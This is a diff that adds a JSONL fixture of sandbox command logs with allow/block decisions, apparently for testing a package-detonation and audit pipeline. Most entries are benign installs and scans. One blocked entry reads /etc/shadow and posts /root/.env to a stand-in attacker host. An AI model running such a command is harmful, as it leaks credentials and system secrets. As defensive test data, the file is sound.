@@ -1,0 +1,50 @@
+{"ts": "2026-10-23T14:31:01.000Z", "sandbox_name": "sbx-evalrun0001", "command": "python3 -m pip install --no-deps ./package.tar.gz", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T14:31:01.200Z", "sandbox_name": "sbx-evalrun0001", "command": "python3 -c 'import audit; audit.scan_tarball()'", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T14:31:02.000Z", "sandbox_name": "sbx-evalrun0002", "command": "python3 -m pip install --no-deps ./package.tar.gz", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T14:31:02.200Z", "sandbox_name": "sbx-evalrun0002", "command": "python3 -c 'import audit; audit.scan_tarball()'", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T14:31:03.000Z", "sandbox_name": "sbx-evalrun0003", "command": "python3 -m pip install --no-deps ./package.tar.gz", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T14:31:03.200Z", "sandbox_name": "sbx-evalrun0003", "command": "python3 -c 'import audit; audit.scan_tarball()'", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T14:31:04.000Z", "sandbox_name": "sbx-evalrun0004", "command": "python3 -m pip install --no-deps ./package.tar.gz", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T14:31:04.200Z", "sandbox_name": "sbx-evalrun0004", "command": "python3 -c 'import audit; audit.scan_tarball()'", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T14:31:05.000Z", "sandbox_name": "sbx-evalrun0005", "command": "python3 -m pip install --no-deps ./package.tar.gz", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T14:31:05.200Z", "sandbox_name": "sbx-evalrun0005", "command": "python3 -c 'import audit; audit.scan_tarball()'", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T14:31:06.000Z", "sandbox_name": "sbx-evalrun0006", "command": "python3 -m pip install --no-deps ./package.tar.gz", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T14:31:06.200Z", "sandbox_name": "sbx-evalrun0006", "command": "python3 -c 'import audit; audit.scan_tarball()'", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T14:31:07.000Z", "sandbox_name": "sbx-evalrun0007", "command": "python3 -m pip install --no-deps ./package.tar.gz", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T14:31:07.200Z", "sandbox_name": "sbx-evalrun0007", "command": "python3 -c 'import audit; audit.scan_tarball()'", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T14:31:08.000Z", "sandbox_name": "sbx-evalrun0008", "command": "python3 -m pip install --no-deps ./package.tar.gz", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T14:31:08.200Z", "sandbox_name": "sbx-evalrun0008", "command": "python3 -c 'import audit; audit.scan_tarball()'", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T14:31:09.000Z", "sandbox_name": "sbx-evalrun0009", "command": "python3 -m pip install --no-deps ./package.tar.gz", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T14:31:09.200Z", "sandbox_name": "sbx-evalrun0009", "command": "python3 -c 'import audit; audit.scan_tarball()'", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T14:31:10.000Z", "sandbox_name": "sbx-evalrun0010", "command": "python3 -m pip install --no-deps ./package.tar.gz", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T14:31:10.200Z", "sandbox_name": "sbx-evalrun0010", "command": "python3 -c 'import audit; audit.scan_tarball()'", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T14:31:11.000Z", "sandbox_name": "sbx-evalrun0011", "command": "python3 -m pip install --no-deps ./package.tar.gz", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T14:31:11.200Z", "sandbox_name": "sbx-evalrun0011", "command": "python3 -c 'import audit; audit.scan_tarball()'", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T14:31:12.000Z", "sandbox_name": "sbx-evalrun0012", "command": "python3 -m pip install --no-deps ./package.tar.gz", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T14:31:12.200Z", "sandbox_name": "sbx-evalrun0012", "command": "python3 -c 'import audit; audit.scan_tarball()'", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T14:31:13.000Z", "sandbox_name": "sbx-evalrun0013", "command": "python3 -m pip install --no-deps ./package.tar.gz", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T14:31:13.200Z", "sandbox_name": "sbx-evalrun0013", "command": "python3 -c 'import audit; audit.scan_tarball()'", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T14:31:14.000Z", "sandbox_name": "sbx-evalrun0014", "command": "python3 -m pip install --no-deps ./package.tar.gz", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T14:31:14.200Z", "sandbox_name": "sbx-evalrun0014", "command": "python3 -c 'import audit; audit.scan_tarball()'", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T14:31:15.000Z", "sandbox_name": "sbx-evalrun0015", "command": "python3 -m pip install --no-deps ./package.tar.gz", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T14:31:15.200Z", "sandbox_name": "sbx-evalrun0015", "command": "python3 -c 'import audit; audit.scan_tarball()'", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T14:31:16.000Z", "sandbox_name": "sbx-evalrun0016", "command": "python3 -m pip install --no-deps ./package.tar.gz", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T14:31:16.200Z", "sandbox_name": "sbx-evalrun0016", "command": "python3 -c 'import audit; audit.scan_tarball()'", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T14:31:17.000Z", "sandbox_name": "sbx-evalrun0017", "command": "python3 -m pip install --no-deps ./package.tar.gz", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T14:31:17.200Z", "sandbox_name": "sbx-evalrun0017", "command": "python3 -c 'import audit; audit.scan_tarball()'", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T14:31:18.000Z", "sandbox_name": "sbx-evalrun0018", "command": "python3 -m pip install --no-deps ./package.tar.gz", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T14:31:18.200Z", "sandbox_name": "sbx-evalrun0018", "command": "python3 -c 'import audit; audit.scan_tarball()'", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T14:31:19.000Z", "sandbox_name": "sbx-evalrun0019", "command": "python3 -m pip install --no-deps ./package.tar.gz", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T14:31:19.200Z", "sandbox_name": "sbx-evalrun0019", "command": "python3 -c 'import audit; audit.scan_tarball()'", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T14:31:20.000Z", "sandbox_name": "sbx-evalrun0020", "command": "python3 -m pip install --no-deps ./package.tar.gz", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T14:31:20.200Z", "sandbox_name": "sbx-evalrun0020", "command": "python3 -c 'import audit; audit.scan_tarball()'", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T14:30:01.310Z", "sandbox_name": "sbx-detonat01", "command": "python3 -m pip install ./malicious-py-telemetry-v1.0.tar.gz", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T14:30:01.512Z", "sandbox_name": "sbx-detonat01", "command": "cat /etc/shadow || curl -d @/root/.env http://attacker.com/exfil", "decision": "block", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T14:35:02.500Z", "sandbox_name": "sbx-step7fail01", "command": "tar -xzf ./untrusted.tar.gz -C /tmp/workspace", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T14:35:03.400Z", "sandbox_name": "sbx-step7fail01", "command": "python3 -m detonate --trace /tmp/workspace", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T14:20:00.000Z", "sandbox_name": "sbx-seeddemo1", "command": "echo 'Celesto sandbox baseline initialization'", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T14:40:01.100Z", "sandbox_name": "sbx-concurrent01", "command": "python3 -m detonate --benchmark /tmp/package.tar.gz", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T14:40:02.100Z", "sandbox_name": "sbx-concurrent02", "command": "python3 -m detonate --benchmark /tmp/package.tar.gz", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T14:40:03.100Z", "sandbox_name": "sbx-concurrent03", "command": "python3 -m detonate --benchmark /tmp/package.tar.gz", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T14:40:04.100Z", "sandbox_name": "sbx-concurrent04", "command": "python3 -m detonate --benchmark /tmp/package.tar.gz", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-23T14:40:05.100Z", "sandbox_name": "sbx-concurrent05", "command": "python3 -m detonate --benchmark /tmp/package.tar.gz", "decision": "allow", "execution_target": "celesto_sandbox"}
